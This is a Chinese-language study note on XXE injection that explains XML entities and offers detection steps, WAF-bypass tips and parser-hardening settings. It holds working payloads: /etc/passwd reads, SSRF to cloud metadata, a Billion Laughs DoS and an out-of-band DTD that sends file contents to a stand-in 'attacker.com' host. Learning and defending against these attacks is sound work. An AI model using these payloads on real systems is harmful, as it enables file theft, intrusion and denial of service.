# 2026-08-11 XXE 与 XML 外部实体注入

> XML 的"外部实体"功能本来是设计来引用外部资源的，但如果解析器配置不当、输入可控，攻击者就能让服务器去读本地文件、访问内网 —— 这就是 XXE。

---

## 一、是什么（我的理解）

### 1.1 XML 基础知识

XML 是标记语言，核心结构：

```xml
<?xml version="1.0" encoding="UTF-8"?>   <!-- 声明 -->
<!DOCTYPE root [ ... ]>                    <!-- DTD：定义规则的地方 -->
<root>
  <user>Tony</user>
</root>
```

**DTD（Document Type Definition，文档类型定义）** 是 XXE 的关键 —— 实体（ENTITY）就定义在这里。

### 1.2 实体是什么

实体 = 变量。定义后可以在 XML 里引用，解析时会被替换成实际内容。

```xml
<!DOCTYPE root [
  <!ENTITY name "Tony">      <!-- 定义内部实体 -->
]>
<root>&name;</root>          <!-- 引用 → 解析后变成 Tony -->
```

### 1.3 XXE 一句话

```
用户能控制 XML 输入 + 解析器允许加载外部实体
  → 用 <!ENTITY> 引用 file:// 等协议
  → 服务器帮你读文件 / 访问内网
```

---

## 二、外部实体与利用方式

### 2.1 外部实体（漏洞核心）

实体不只可以是字符串，还可以是**外部资源**：

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">   <!-- 读本地文件 -->
]>
<root>&xxe;</root>
```

解析时 `&xxe;` 会被替换成 `/etc/passwd` 的内容 —— 这就是任意文件读取。

### 2.2 常用协议

| 协议 | 用途 | 示例 |
|------|------|------|
| `file://` | 读本地文件 | `file:///etc/passwd`、`file:///c:/windows/win.ini` |
| `http://` | 访问内网 / SSRF | `http://169.254.169.254/latest/meta-data/` |
| `php://filter` | PHP 环境读文件（配合 base64） | `php://filter/read=convert.base64-encode/resource=/etc/passwd` |
| `expect://` | PHP 环境命令执行（需扩展） | `expect://id` |

### 2.3 经典 Payload：读文件

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**注意**：很多场景没有回显（盲 XXE），或者特殊字符（`<` `>` 等）会破坏 XML 结构 —— 需要编码绕过。

---

## 三、盲 XXE（Blind XXE）

没有回显时，不能直接看到文件内容，换思路 —— **让服务器把数据带到外面去**（带外 OOB）。

### 3.1 带外读取（OOB XXE）

思路：本地放一个恶意 DTD 文件，让目标服务器去加载，再把文件内容拼进 URL 发到自己的服务器。

**恶意 DTD（放在攻击者服务器）**：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**目标发送的 Payload**：
```xml
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
```

流程：目标解析 XML → 加载攻击者的 evil.dtd → evil.dtd 读 /etc/passwd → 内容拼进 URL 请求攻击者服务器 → 攻击者从日志里拿到数据。

### 3.2 报错型 XXE

利用解析器的错误信息把文件内容带出来（部分解析器支持）：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### 3.3 盲 XXE 的探测工具

- **XXE 检测首选 DNSLog / Burp Collaborator**：先发一个 `http://xxx.dnslog.cn` 的外部实体，看目标是否发起请求 —— 有请求 = 解析器允许外部实体 = 存在 XXE，再上 OOB 读取
- Burp 的 Collaborator、xee（工具）等

---

## 四、XXE 的四种危害（按严重程度）

| 危害 | 说明 | Payload 方向 |
|------|------|-------------|
| 任意文件读取 | 读配置文件、源码、密钥 | `file://` |
| SSRF | 访问内网服务、云元数据 | `http://169.254.169.254/` |
| 拒绝服务（DoS） | 实体扩展爆炸（Billion Laughs） | 嵌套实体指数级展开 |
| RCE | 少数环境（PHP expect、Java 某些 Gadget） | `expect://` |

### Billion Laughs（实体扩展 DoS）

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;...">   <!-- 指数级嵌套 -->
]>
```

解析时内容指数膨胀，直接打爆内存 —— 经典 DoS 手法。

---

## 五、怎么发现 XXE（我的检测思路）

```
① 找 XML 入口
   请求体是 XML（Content-Type: application/xml / text/xml）
   或参数能被解析成 XML（上传 .xml 文件、SOAP、SVG、DOCX 里都嵌 XML）

② 改 Content-Type
   把 application/json 改成 application/xml，塞 XML Payload 试试
   （很多接口解析器是共用的，可能意外解析 XML）

③ 验证存在性
   先发无害的外部实体到 DNSLog → 看有没有请求
   有 = 存在 XXE → 再读文件 / 打 OOB

④ 注意过滤
   <!DOCTYPE、<!ENTITY 可能被 WAF 过滤
   编码绕过：UTF-16 编码、参数实体拆分、大小写混淆
```

---

## 六、怎么防御

| 层面 | 措施 |
|------|------|
| 解析器配置 | **禁用外部实体**（各语言都有开关，见下表） |
| 输入校验 | 拒绝含 `<!DOCTYPE` 的请求；白名单校验 |
| 上传文件 | SVG、DOCX、XLSX 等文件上传前重新解析/消毒 |
| WAF | 拦截 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM` 关键字 |
| 依赖 | 升级 XML 解析库（修复已知 XXE 漏洞） |

### 各语言禁用外部实体的开关（防御重点）

```python
# Python lxml
parser = etree.XMLParser(resolve_entities=False, no_network=True)

# Java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)

# PHP
libxml_disable_entity_loader(true);

# .NET
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

---

## 七、我的总结

| 要点 | 一句话 |
|------|--------|
| XXE 本质 | XML 外部实体 + 解析器没禁外部实体 + 输入可控 |
| 最大危害 | 任意文件读取 → 配置/源码/密钥泄露；配合 SSRF 打内网 |
| 盲 XXE | 没回显就用 OOB（恶意 DTD + 自己的服务器收数据） |
| 万能探测 | DNSLog + 无害外部实体，先确认再深入 |
| 防御关键 | 解析器显式禁用外部实体，比啥都管用 |

---

## 关联笔记

- [文件包含漏洞详解](./2026-08-05-文件包含漏洞详解.md) — `php://filter` 协议两边都会用到，读文件思路共通
- [CSRF与SSRF漏洞详解](./2026-08-04-CSRF与SSRF漏洞详解.md) — XXE 的 http:// 实体本质就是 SSRF 的一种
- [加解密算法与编码](./加解密算法与编码.md) — 文件读取时的编码转换（base64）经常配合使用

## 待实践

- [ ] 本地起 DVWA / 靶场，把 JSON 接口改成 XML 测 XXE（验证 Content-Type 切换）
- [ ] 用 DNSLog 完整走一遍"探测 → 确认 → OOB 读取"流程
- [ ] 练盲 XXE：搭一个恶意 DTD 服务器，看数据怎么被带出来
- [ ] 试试 SVG 上传 XXE（SVG 本质是 XML，常用于图片上传场景）

> ⚠️ 声明：以上技术仅用于 CTF 竞赛和授权靶场环境。
